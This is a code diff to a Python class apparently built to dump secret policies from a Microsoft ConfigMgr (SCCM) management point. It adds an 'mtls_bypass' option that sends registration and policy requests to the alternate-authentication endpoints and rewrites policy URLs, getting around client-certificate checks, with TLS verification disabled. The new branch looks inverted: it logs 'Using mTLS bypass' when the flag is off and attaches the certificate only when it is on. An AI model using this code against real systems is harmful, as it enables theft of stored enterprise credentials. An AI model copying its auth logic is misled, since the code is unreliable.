@@ -33,7 +33,8 @@ class PoliciesDumper():
                  machine_name,
                  machine_pass,
                  pki_cert,
-                 pki_key
+                 pki_key,
+                 mtls_bypass
                 ):
         self.management_point = management_point
         self.output_dir = output_dir
@@ -43,6 +44,7 @@ class PoliciesDumper():
         self.machine_pass = machine_pass
         self.pki_cert = pki_cert
         self.pki_key = pki_key
+        self.mtls_bypass = mtls_bypass
         self.client_guid = ""
         self.secret_policies = {}
         self.use_https = True if self.management_point.startswith('https://') else False
@@ -76,8 +78,11 @@ class PoliciesDumper():
         if machine_name is not None and machine_pass is not None and use_existing_device is None:
             self.session.auth = HttpNtlmAuth(machine_name, machine_pass)
         if self.use_https:
-            logger.info("[INFO] HTTPS required. Using client certificate authentication")
-            self.session.cert = (pki_cert, pki_key)
+            if not mtls_bypass:
+                logger.info("[INFO] HTTPS required. Using mTLS bypass")
+            else:
+                logger.info("[INFO] HTTPS required. Using client certificate authentication")
+                self.session.cert = (pki_cert, pki_key)
             self.session.verify = False
 
 
@@ -149,7 +154,9 @@ class PoliciesDumper():
             "Connection": "close",
             "Content-Type": "multipart/mixed; boundary=\"aAbBcCdDv1234567890VxXyYzZ\""
         }
-        if self.machine_name is not None and self.machine_pass is not None:
+        if self.mtls_bypass:
+            r = self.session.request("CCM_POST", f"{self.management_point}/ccm_system_altauth/request", headers={**self.session.headers, **additional_headers}, data=registration_request_payload)
+        elif self.machine_name is not None and self.machine_pass is not None:
             r = self.session.request("CCM_POST", f"{self.management_point}/ccm_system_windowsauth/request", headers={**self.session.headers, **additional_headers}, data=registration_request_payload)
         else:
             r = self.session.request("CCM_POST", f"{self.management_point}/ccm_system/request", headers={**self.session.headers, **additional_headers}, data=registration_request_payload)
@@ -216,7 +223,10 @@ class PoliciesDumper():
             "Connection": "close",
             "Content-Type": "multipart/mixed; boundary=\"aAbBcCdDv1234567890VxXyYzZ\""
         }
-        r = self.session.request("CCM_POST", f"{self.management_point}/ccm_system/request", headers={**self.session.headers, **additional_headers}, data=policies_request_payload)
+        if self.mtls_bypass:
+            r = self.session.request("CCM_POST", f"{self.management_point}/ccm_system_altauth/request", headers={**self.session.headers, **additional_headers}, data=policies_request_payload)
+        else:
+            r = self.session.request("CCM_POST", f"{self.management_point}/ccm_system/request", headers={**self.session.headers, **additional_headers}, data=policies_request_payload)
         multipart_data = decoder.MultipartDecoder.from_response(r)
         for part in multipart_data.parts:
             if part.headers[b'content-type'] == b'application/octet-stream':
@@ -282,6 +292,8 @@ class PoliciesDumper():
 
 
     def request_policy(self, policy_url):
+        if self.mtls_bypass:
+            policy_url = policy_url.replace('/SMS_MP/', '/SMS_MP_ALTAUTH/')
         additional_headers = {
             "Connection": "close",
             "User-Agent": "ConfigMgr Messaging HTTP Sender",
